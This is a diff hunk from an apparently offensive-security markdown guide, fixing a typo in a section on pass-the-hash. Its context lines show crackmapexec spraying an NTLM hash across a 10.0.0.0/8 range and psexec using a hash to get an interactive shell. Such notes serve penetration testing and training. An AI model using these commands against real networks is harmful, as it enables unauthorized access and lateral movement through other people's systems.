@@ -162,7 +162,7 @@ crackmapexec.py 10.0.0.0/8 -u user_name -H `NTLMv1_hash` --local
 psexec user@computer_ip -H `NTLMv1_hash`
 
 ### reproduce
-one u get a pwned sign so that user have login access to that computer
+once u get a pwned sign so that user have login access to that computer
 [logo]: img/hashed.png
 ![alt text](img/hashed.png "hash")
 after that we can use tools like psexec to get an interactive shell
